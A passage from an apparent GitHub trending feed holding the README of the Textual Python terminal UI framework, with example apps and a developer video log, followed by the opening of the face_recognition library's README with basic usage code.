    <summary type="html">&lt;p&gt;Textual is a TUI (Text User Interface) framework for Python inspired by modern web development.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Textual&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Textualize/textual/main/imgs/textual.png&#34; alt=&#34;screenshot&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Textual is a TUI (Text User Interface) framework for Python inspired by modern web development. Currently a &lt;strong&gt;Work in Progress&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;⚠ &lt;strong&gt;NOTE:&lt;/strong&gt; We (&lt;a href=&#34;https://www.textualize.io&#34;&gt;Textualize.io&lt;/a&gt;) are hard at work on the &lt;strong&gt;css&lt;/strong&gt; branch. We will maintain the 0.1.0 branch for the near future but may not be able to accept API changes. If you would like to contribute code via a PR, please raise a discussion first, to avoid disappointment.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Follow &lt;a href=&#34;https://twitter.com/willmcgugan&#34;&gt;@willmcgugan&lt;/a&gt; for progress updates, or post in Discussions if you have any requests / suggestions.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://gitter.im/textual-ui/community?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=badge&#34;&gt;&lt;img src=&#34;https://badges.gitter.im/textual-ui/community.svg?sanitize=true&#34; alt=&#34;Join the chat at https://gitter.im/textual-ui/community&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Compatibility&lt;/h2&gt; &#xA;&lt;p&gt;Textual currently runs on &lt;strong&gt;MacOS / Linux / Windows&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;How it works&lt;/h2&gt; &#xA;&lt;p&gt;Textual uses &lt;a href=&#34;https://github.com/willmcgugan/rich&#34;&gt;Rich&lt;/a&gt; to render rich text, so anything that Rich can render may be used in Textual.&lt;/p&gt; &#xA;&lt;p&gt;Event handling in Textual is asynchronous (using &lt;code&gt;async&lt;/code&gt; and &lt;code&gt;await&lt;/code&gt; keywords). Widgets (UI components) can independently update and communicate with each other via message passing.&lt;/p&gt; &#xA;&lt;p&gt;Textual has more in common with modern web development than it does with &lt;a href=&#34;https://en.wikipedia.org/wiki/Curses_(programming_library)&#34;&gt;curses&lt;/a&gt;; layout is done with CSS grid and (soon) the theme may be customized with CSS. Other techniques are borrowed from JS frameworks such as Vue and React.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;You can install Textual via pip (&lt;code&gt;pip install textual&lt;/code&gt;), or by checking out the repo and installing with &lt;a href=&#34;https://python-poetry.org/docs/&#34;&gt;poetry&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;poetry install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Once installed you can run the following command for a quick test, or see examples (below):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python -m textual.app&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Textual requires Python 3.7 or above.&lt;/p&gt; &#xA;&lt;h2&gt;Examples&lt;/h2&gt; &#xA;&lt;p&gt;Until I&#39;ve written the documentation, the &lt;a href=&#34;https://github.com/willmcgugan/textual/tree/main/examples/&#34;&gt;examples&lt;/a&gt; may be the best way to learn Textual.&lt;/p&gt; &#xA;&lt;p&gt;You can see some of these examples in action in the &lt;a href=&#34;https://raw.githubusercontent.com/Textualize/textual/main/#developer-video-log&#34;&gt;Developer Video Log&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/willmcgugan/textual/tree/main/examples/animation.py&#34;&gt;animation.py&lt;/a&gt; Demonstration of 60fps animation easing function&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/willmcgugan/textual/tree/main/examples/calculator.py&#34;&gt;calculator.py&lt;/a&gt; A &#34;clone&#34; of the MacOS calculator using Grid layout&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/willmcgugan/textual/tree/main/examples/code_viewer.py&#34;&gt;code_viewer.py&lt;/a&gt; A demonstration of a tree view which loads syntax highlighted code&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/willmcgugan/textual/tree/main/examples/grid.py&#34;&gt;grid.py&lt;/a&gt; A simple demonstration of adding widgets in a Grid layout&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/willmcgugan/textual/tree/main/examples/grid_auto.py&#34;&gt;grid_auto.py&lt;/a&gt; A demonstration of automatic Grid layout&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/willmcgugan/textual/tree/main/examples/simple.py&#34;&gt;simple.py&lt;/a&gt; A very simple Textual app with scrolling Markdown view&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Building Textual applications&lt;/h2&gt; &#xA;&lt;p&gt;&lt;em&gt;This guide is a work in progress&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s look at the simplest Textual app which does &lt;em&gt;something&lt;/em&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from textual.app import App&#xA;&#xA;&#xA;class Beeper(App):&#xA;    def on_key(self):&#xA;        self.console.bell()&#xA;&#xA;&#xA;Beeper.run()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Here we can see a textual app with a single &lt;code&gt;on_key&lt;/code&gt; method which will handle key events. Pressing any key will result in playing the terminal bell (generally an irritating beep). Hit Ctrl+C to exit.&lt;/p&gt; &#xA;&lt;p&gt;Event handlers in Textual are defined by convention, not by inheritance (there&#39;s no base class with all the handlers defined). Each event has a &lt;code&gt;name&lt;/code&gt; attribute which for the key event is simply &lt;code&gt;&#34;key&#34;&lt;/code&gt;. Textual will call the method named &lt;code&gt;on_&amp;lt;event.name&amp;gt;&lt;/code&gt; if it exists.&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s look at a &lt;em&gt;slightly&lt;/em&gt; more interesting example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from textual.app import App&#xA;&#xA;&#xA;class ColorChanger(App):&#xA;    def on_key(self, event):&#xA;        if event.key.isdigit():&#xA;            self.background = f&#34;on color({event.key})&#34;&#xA;&#xA;&#xA;ColorChanger.run(log=&#34;textual.log&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You&#39;ll notice that the &lt;code&gt;on_key&lt;/code&gt; method above contains an additional &lt;code&gt;event&lt;/code&gt; parameter which wasn&#39;t present on the beeper example. If the &lt;code&gt;event&lt;/code&gt; argument is present, Textual will call the handler with an event object. Every event has an associated handler object, in this case it is a KeyEvent which contains additional information regarding which key was pressed.&lt;/p&gt; &#xA;&lt;p&gt;The key event handler above will set the background attribute if you press the keys 0-9, which turns the terminal to the corresponding &lt;a href=&#34;https://rich.readthedocs.io/en/latest/appendix/colors.html&#34;&gt;ansi color&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Note that we didn&#39;t need to explicitly refresh the screen or draw anything. Setting the &lt;code&gt;background&lt;/code&gt; attribute to a &lt;a href=&#34;https://rich.readthedocs.io/en/latest/style.html&#34;&gt;Rich style&lt;/a&gt; is enough for Textual to update the visuals. This is an example of &lt;em&gt;reactivity&lt;/em&gt; in Textual. To make changes to the terminal interface you modify the &lt;em&gt;state&lt;/em&gt; and let Textual update the UI.&lt;/p&gt; &#xA;&lt;h2&gt;Widgets&lt;/h2&gt; &#xA;&lt;p&gt;To make more interesting apps you will need to make use of &lt;em&gt;widgets&lt;/em&gt;, which are independent user interface elements. Textual comes with a (growing) library of widgets, but you can develop your own.&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s look at an app which contains widgets. We will be using the built-in &lt;code&gt;Placeholder&lt;/code&gt; widget which you can use to design application layouts before you implement the real content.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from textual.app import App&#xA;from textual.widgets import Placeholder&#xA;&#xA;&#xA;class SimpleApp(App):&#xA;&#xA;    async def on_mount(self) -&amp;gt; None:&#xA;        await self.view.dock(Placeholder(), edge=&#34;left&#34;, size=40)&#xA;        await self.view.dock(Placeholder(), Placeholder(), edge=&#34;top&#34;)&#xA;&#xA;&#xA;SimpleApp.run(log=&#34;textual.log&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This app contains a single event handler &lt;code&gt;on_mount&lt;/code&gt;. The mount event is sent when the app or widget is ready to start processing events, and is typically used for initialization. You may have noticed that &lt;code&gt;on_mount&lt;/code&gt; is an &lt;code&gt;async&lt;/code&gt; function. Since Textual is an asynchronous framework we will need this if we need to call most other methods.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;on_mount&lt;/code&gt; method makes two calls to &lt;code&gt;self.view.dock&lt;/code&gt; which adds widgets to the terminal.&lt;/p&gt; &#xA;&lt;p&gt;Here&#39;s the first line in the mount handler:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;await self.view.dock(Placeholder(), edge=&#34;left&#34;, size=40)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note this method is asynchronous like almost all API methods in Textual. We are awaiting &lt;code&gt;self.view.dock&lt;/code&gt; which takes a newly constructed Placeholder widget, and docks it on to the &lt;code&gt;&#34;left&#34;&lt;/code&gt; edge of the terminal with a size of 40 characters. In a real app you might use this to display a side-bar.&lt;/p&gt; &#xA;&lt;p&gt;The following line is similar:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;await self.view.dock(Placeholder(), Placeholder(), edge=&#34;top&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You will notice that this time we are docking &lt;em&gt;two&lt;/em&gt; Placeholder objects onto the &lt;code&gt;&#34;top&#34;&lt;/code&gt; edge. We haven&#39;t set an explicit size this time so Textual will divide the remaining size amongst the two new widgets.&lt;/p&gt; &#xA;&lt;p&gt;The last line calls the &lt;code&gt;run&lt;/code&gt; class method in the usual way, but with an argument we haven&#39;t seen before: &lt;code&gt;log=&#34;textual.log&#34;&lt;/code&gt; tells Textual to write log information to the given file. You can tail textual.log to see events being processed and other debug information.&lt;/p&gt; &#xA;&lt;p&gt;If you run the above example, you will see something like the following:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Textualize/textual/main/imgs/widgets.png&#34; alt=&#34;widgets&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;If you move the mouse over the terminal you will notice that widgets receive mouse events. You can click any of the placeholders to give it input focus.&lt;/p&gt; &#xA;&lt;p&gt;The dock layout feature is very flexible, but for more sophisticated layouts we can use the grid API. See the &lt;a href=&#34;https://github.com/willmcgugan/textual/raw/main/examples/calculator.py&#34;&gt;calculator.py&lt;/a&gt; example which makes use of Grid.&lt;/p&gt; &#xA;&lt;h3&gt;Creating Widgets&lt;/h3&gt; &#xA;&lt;p&gt;You can create your own widgets by subclassing the &lt;code&gt;textual.widget.Widget&lt;/code&gt; class and implementing a &lt;code&gt;render()&lt;/code&gt; method which should return anything that can be rendered with &lt;a href=&#34;https://rich.readthedocs.io/en/latest/introduction.html&#34;&gt;Rich&lt;/a&gt;, including a plain string which will be interpreted as &lt;a href=&#34;https://rich.readthedocs.io/en/latest/markup.html&#34;&gt;console markup&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s look at an example with a custom widget:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from rich.panel import Panel&#xA;&#xA;from textual.app import App&#xA;from textual.reactive import Reactive&#xA;from textual.widget import Widget&#xA;&#xA;&#xA;class Hover(Widget):&#xA;&#xA;    mouse_over = Reactive(False)&#xA;&#xA;    def render(self) -&amp;gt; Panel:&#xA;        return Panel(&#34;Hello [b]World[/b]&#34;, style=(&#34;on red&#34; if self.mouse_over else &#34;&#34;))&#xA;&#xA;    def on_enter(self) -&amp;gt; None:&#xA;        self.mouse_over = True&#xA;&#xA;    def on_leave(self) -&amp;gt; None:&#xA;        self.mouse_over = False&#xA;&#xA;&#xA;class HoverApp(App):&#xA;    &#34;&#34;&#34;Demonstrates custom widgets&#34;&#34;&#34;&#xA;&#xA;    async def on_mount(self) -&amp;gt; None:&#xA;        hovers = (Hover() for _ in range(10))&#xA;        await self.view.dock(*hovers, edge=&#34;top&#34;)&#xA;&#xA;&#xA;HoverApp.run(log=&#34;textual.log&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The &lt;code&gt;Hover&lt;/code&gt; class is a custom widget which displays a panel containing the classic text &#34;Hello World&#34;. The first line in the Hover class may seem a little mysterious at this point:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;mouse_over = Reactive(False)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This adds a &lt;code&gt;mouse_over&lt;/code&gt; attribute to your class which is a bool with a default of &lt;code&gt;False&lt;/code&gt;. Adding attributes like this makes them &lt;em&gt;reactive&lt;/em&gt;: any changes will result in the widget updating.&lt;/p&gt; &#xA;&lt;p&gt;The following &lt;code&gt;render()&lt;/code&gt; method is where you define how the widget should be displayed. In the Hover widget we return a &lt;a href=&#34;https://rich.readthedocs.io/en/latest/panel.html&#34;&gt;Panel&lt;/a&gt; containing rich text with a background that changes depending on the value of &lt;code&gt;mouse_over&lt;/code&gt;. The goal here is to add a mouse hover effect to the widget, which we can achieve by handling two events: &lt;code&gt;Enter&lt;/code&gt; and &lt;code&gt;Leave&lt;/code&gt;. These events are sent when the mouse enters or leaves the widget.&lt;/p&gt; &#xA;&lt;p&gt;Here are the two event handlers again:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;    def on_enter(self) -&amp;gt; None:&#xA;        self.mouse_over = True&#xA;&#xA;    def on_leave(self) -&amp;gt; None:&#xA;        self.mouse_over = False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Both event handlers set the &lt;code&gt;mouse_over&lt;/code&gt; attribute which will result in the widget&#39;s &lt;code&gt;render()&lt;/code&gt; method being called.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;HoverApp&lt;/code&gt; has a &lt;code&gt;on_mount&lt;/code&gt; handler which creates 10 Hover widgets and docks them on the top edge to create a vertical stack:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;    async def on_mount(self) -&amp;gt; None:&#xA;        hovers = (Hover() for _ in range(10))&#xA;        await self.view.dock(*hovers, edge=&#34;top&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you run this script you will see something like the following:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Textualize/textual/main/imgs/custom.gif&#34; alt=&#34;widgets&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;If you move your mouse over the terminal you should see that the widget under the mouse cursor changes to a red background.&lt;/p&gt; &#xA;&lt;h3&gt;Actions and key bindings&lt;/h3&gt; &#xA;&lt;p&gt;Actions in Textual are white-listed functions that may be bound to keys. Let&#39;s look at a trivial example of binding a key to an action. Here is an app which exits when we hit the Q key:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from textual.app import App&#xA;&#xA;&#xA;class Quitter(App):&#xA;    async def on_load(self, event):&#xA;        await self.bind(&#34;q&#34;, &#34;quit&#34;)&#xA;&#xA;&#xA;Quitter.run()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you run this you will get a blank terminal which will return to the prompt when you press Q.&lt;/p&gt; &#xA;&lt;p&gt;Binding is done in the Load event handler. The &lt;code&gt;bind&lt;/code&gt; method takes the key (in this case &#34;q&#34;) and binds it to an action (&#34;quit&#34;). The quit action is built in to Textual and simply exits the app.&lt;/p&gt; &#xA;&lt;p&gt;To define your own actions, add a method that begins with &lt;code&gt;action_&lt;/code&gt;, which may take parameters. Let&#39;s create a simple action that changes the color of the terminal and binds keys to it:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from textual.app import App&#xA;&#xA;&#xA;class Colorizer(App):&#xA;&#xA;    async def on_load(self, event):&#xA;        await self.bind(&#34;r&#34;, &#34;color(&#39;red&#39;)&#34;)&#xA;        await self.bind(&#34;g&#34;, &#34;color(&#39;green&#39;)&#34;)&#xA;        await self.bind(&#34;b&#34;, &#34;color(&#39;blue&#39;)&#34;)&#xA;&#xA;    async def action_color(self, color:str) -&amp;gt; None:&#xA;        self.background = f&#34;on {color}&#34;&#xA;&#xA;&#xA;Colorizer.run()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you run this app you can hit the keys R, G, or B to change the color of the background.&lt;/p&gt; &#xA;&lt;p&gt;In the &lt;code&gt;on_load&lt;/code&gt; method we have bound the keys R, G, and B to the &lt;code&gt;color&lt;/code&gt; action with a single parameter. When you press any of these three keys Textual will call the method &lt;code&gt;action_color&lt;/code&gt; with the appropriate parameter.&lt;/p&gt; &#xA;&lt;p&gt;You could be forgiven for thinking that &lt;code&gt;&#34;color(&#39;red&#39;)&#34;&lt;/code&gt; is Python code which Textual evaluates. This is not the case. The action strings are parsed and may not include expressions or arbitrary code. The reason that strings are used over a callable is that (in a future update) key bindings may be loaded from a configuration file.&lt;/p&gt; &#xA;&lt;h3&gt;More on Events&lt;/h3&gt; &#xA;&lt;p&gt;&lt;em&gt;TODO&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Watchers&lt;/h3&gt; &#xA;&lt;p&gt;&lt;em&gt;TODO&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Animation&lt;/h3&gt; &#xA;&lt;p&gt;&lt;em&gt;TODO&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Timers and Intervals&lt;/h3&gt; &#xA;&lt;p&gt;Textual has a &lt;code&gt;set_timer&lt;/code&gt; and a &lt;code&gt;set_interval&lt;/code&gt; method which work much like their Javascript counterparts. The &lt;code&gt;set_timer&lt;/code&gt; method will invoke a callable after a given period of time, and &lt;code&gt;set_interval&lt;/code&gt; will invoke a callable repeatedly. Unlike Javascript these methods expect the time to be in seconds (&lt;em&gt;not&lt;/em&gt; milliseconds).&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s create a simple terminal based clock with the &lt;code&gt;set_interval&lt;/code&gt; method:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from datetime import datetime&#xA;&#xA;from rich.align import Align&#xA;&#xA;from textual.app import App&#xA;from textual.widget import Widget&#xA;&#xA;&#xA;class Clock(Widget):&#xA;    def on_mount(self):&#xA;        self.set_interval(1, self.refresh)&#xA;&#xA;    def render(self):&#xA;        time = datetime.now().strftime(&#34;%c&#34;)&#xA;        return Align.center(time, vertical=&#34;middle&#34;)&#xA;&#xA;&#xA;class ClockApp(App):&#xA;    async def on_mount(self):&#xA;        await self.view.dock(Clock())&#xA;&#xA;&#xA;ClockApp.run()&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you run this app you will see the current time in the center of the terminal until you hit Ctrl+C.&lt;/p&gt; &#xA;&lt;p&gt;The Clock widget displays the time using &lt;a href=&#34;https://rich.readthedocs.io/en/latest/reference/align.html&#34;&gt;rich.align.Align&lt;/a&gt; to position it in the center. In the clock&#39;s Mount handler there is the following call to &lt;code&gt;set_interval&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;self.set_interval(1, self.refresh)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This tells Textual to call a function (in this case &lt;code&gt;self.refresh&lt;/code&gt; which updates the widget) once a second. When a widget is refreshed it calls &lt;code&gt;Clock.render&lt;/code&gt; again to display the latest time.&lt;/p&gt; &#xA;&lt;h2&gt;Developer Video Log&lt;/h2&gt; &#xA;&lt;p&gt;Since Textual is a visual medium, I&#39;ll be documenting new features and milestones here.&lt;/p&gt; &#xA;&lt;h3&gt;Update 1 - Basic scrolling&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=zNW7U36GHlU&#34;&gt;&lt;img src=&#34;https://yt-embed.herokuapp.com/embed?v=zNW7U36GHlU&amp;amp;img=0&#34; alt=&#34;Textual update 1&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Update 2 - Keyboard toggle&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=bTYeFOVNXDI&#34;&gt;&lt;img src=&#34;https://yt-embed.herokuapp.com/embed?v=bTYeFOVNXDI&amp;amp;img=0&#34; alt=&#34;Textual update 2&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Update 3 - New scrollbars and smooth scrolling&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=4LVl3ClrXIs&#34;&gt;&lt;img src=&#34;https://yt-embed.herokuapp.com/embed?v=4LVl3ClrXIs&amp;amp;img=0&#34; alt=&#34;Textual update 3&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Update 4 - Animation system with easing function&lt;/h3&gt; &#xA;&lt;p&gt;Now with a system to animate changes to values, going from the initial to the final value in small increments over time . Here applied to the scroll position. The animation system supports CSS like &lt;em&gt;easing functions&lt;/em&gt;. You may be able to tell from the video that the page up / down keys cause the window to first speed up and then slow down.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=k2VwOp1YbSk&#34;&gt;&lt;img src=&#34;https://yt-embed.herokuapp.com/embed?v=k2VwOp1YbSk&amp;amp;img=0&#34; alt=&#34;Textual update 4&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Update 5 - New Layout system&lt;/h3&gt; &#xA;&lt;p&gt;A new update system allows for overlapping layers. Animation is now synchronized with the display which makes it very smooth!&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=XxRnfx2WYRw&#34;&gt;&lt;img src=&#34;https://yt-embed.herokuapp.com/embed?v=XxRnfx2WYRw&amp;amp;img=0&#34; alt=&#34;Textual update 5&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Update 6 - New Layout API&lt;/h3&gt; &#xA;&lt;p&gt;New version (0.1.4) with API updates and the new layout system.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=jddccDuVd3E&#34;&gt;&lt;img src=&#34;https://yt-embed.herokuapp.com/embed?v=jddccDuVd3E&amp;amp;img=0&#34; alt=&#34;Textual update 6&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Update 7 - New Grid Layout&lt;/h3&gt; &#xA;&lt;p&gt;&lt;strong&gt;11 July 2021&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Added a new layout system modelled on CSS grid. The example demonstrates how once created a grid will adapt to the available space.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=Zh9CEvu73jc&#34;&gt;&lt;img src=&#34;https://yt-embed.herokuapp.com/embed?v=Zh9CEvu73jc&amp;amp;img=0&#34; alt=&#34;Textual update 7&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Update 8 - Tree control and scroll views&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;6 Aug 2021&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Added a tree control and refactored the renderer to allow for widgets within a scrollable view&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=J-dzzD6NQJ4&#34;&gt;&lt;img src=&#34;https://yt-embed.herokuapp.com/embed?v=J-dzzD6NQJ4&amp;amp;img=0&#34; alt=&#34;Textual update 8&#34;&gt;&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>ageitgey/face_recognition</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/ageitgey/face_recognition</id>
    <link href="https://github.com/ageitgey/face_recognition" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The world&#39;s simplest facial recognition api for Python and the command line&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Face Recognition&lt;/h1&gt; &#xA;&lt;p&gt;&lt;em&gt;You can also read a translated version of this file &lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/README_Simplified_Chinese.md&#34;&gt;in Chinese 简体中文版&lt;/a&gt; or &lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/README_Korean.md&#34;&gt;in Korean 한국어&lt;/a&gt; or &lt;a href=&#34;https://github.com/m-i-k-i/face_recognition/raw/master/README_Japanese.md&#34;&gt;in Japanese 日本語&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;Recognize and manipulate faces from Python or from the command line with the world&#39;s simplest face recognition library.&lt;/p&gt; &#xA;&lt;p&gt;Built using &lt;a href=&#34;http://dlib.net/&#34;&gt;dlib&lt;/a&gt;&#39;s state-of-the-art face recognition built with deep learning. The model has an accuracy of 99.38% on the &lt;a href=&#34;http://vis-www.cs.umass.edu/lfw/&#34;&gt;Labeled Faces in the Wild&lt;/a&gt; benchmark.&lt;/p&gt; &#xA;&lt;p&gt;This also provides a simple &lt;code&gt;face_recognition&lt;/code&gt; command line tool that lets you do face recognition on a folder of images from the command line!&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://pypi.python.org/pypi/face_recognition&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/v/face_recognition.svg?sanitize=true&#34; alt=&#34;PyPI&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/ageitgey/face_recognition/actions?query=workflow%3ACI&#34;&gt;&lt;img src=&#34;https://github.com/ageitgey/face_recognition/workflows/CI/badge.svg?branch=master&amp;amp;event=push&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;http://face-recognition.readthedocs.io/en/latest/?badge=latest&#34;&gt;&lt;img src=&#34;https://readthedocs.org/projects/face-recognition/badge/?version=latest&#34; alt=&#34;Documentation Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;h4&gt;Find faces in pictures&lt;/h4&gt; &#xA;&lt;p&gt;Find all the faces that appear in a picture:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cloud.githubusercontent.com/assets/896692/23625227/42c65360-025d-11e7-94ea-b12f28cb34b4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import face_recognition&#xA;image = face_recognition.load_image_file(&#34;your_file.jpg&#34;)&#xA;face_locations = face_recognition.face_locations(image)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Find and manipulate facial features in pictures&lt;/h4&gt; &#xA;&lt;p&gt;Get the locations and outlines of each person&#39;s eyes, nose, mouth and chin.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cloud.githubusercontent.com/assets/896692/23625282/7f2d79dc-025d-11e7-8728-d8924596f8fa.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import face_recognition&#xA;image = face_recognition.load_image_file(&#34;your_file.jpg&#34;)&#xA;face_landmarks_list = face_recognition.face_landmarks(image)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Finding facial features is super useful for lots of important stuff. But you can also use it for really stupid stuff like applying &lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/digital_makeup.py&#34;&gt;digital make-up&lt;/a&gt; (think &#39;Meitu&#39;):&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cloud.githubusercontent.com/assets/896692/23625283/80638760-025d-11e7-80a2-1d2779f7ccab.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Identify faces in pictures&lt;/h4&gt; &#xA;&lt;p&gt;Recognize who appears in each photo.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cloud.githubusercontent.com/assets/896692/23625229/45e049b6-025d-11e7-89cc-8a71cf89e713.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import face_recognition&#xA;known_image = face_recognition.load_image_file(&#34;biden.jpg&#34;)&#xA;unknown_image = face_recognition.load_image_file(&#34;unknown.jpg&#34;)&#xA;&#xA;biden_encoding = face_recognition.face_encodings(known_image)[0]&#xA;unknown_encoding = face_recognition.face_encodings(unknown_image)[0]&#xA;&#xA;results = face_recognition.compare_faces([biden_encoding], unknown_encoding)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can even use this library with other Python libraries to do real-time face recognition:&lt;/p&gt; 